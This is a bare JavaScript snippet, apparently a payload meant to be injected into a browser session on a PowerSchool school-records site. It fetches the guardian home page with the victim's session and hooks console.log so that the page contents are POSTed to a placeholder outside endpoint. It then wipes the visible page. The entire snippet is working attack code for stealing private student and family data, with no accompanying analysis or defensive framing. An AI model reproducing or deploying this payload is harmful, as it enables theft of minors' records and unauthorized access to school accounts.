function makeHttpObject(){try{return new XMLHttpRequest()}catch(error){}try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(error){}try{return new ActiveXObject("Microsoft.XMLHTTP")}catch(error){}throw new Error("Could not create HTTP request object.");}var request=makeHttpObject();request.open("GET","[the base URL of the website where PowerSchool is installed]/guardian/home.html",true);request.send(null);request.onreadystatechange=function(){if(request.readyState==4)console.log(request.responseText)};
(function(){
    var oldLog = console.log;
    console.log = function (message) {
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "[the endpoint's URL]", true);
        xhttp.send(message);
        oldLog.apply(console, arguments);
    };
})();
document.body.innerHTML = ''
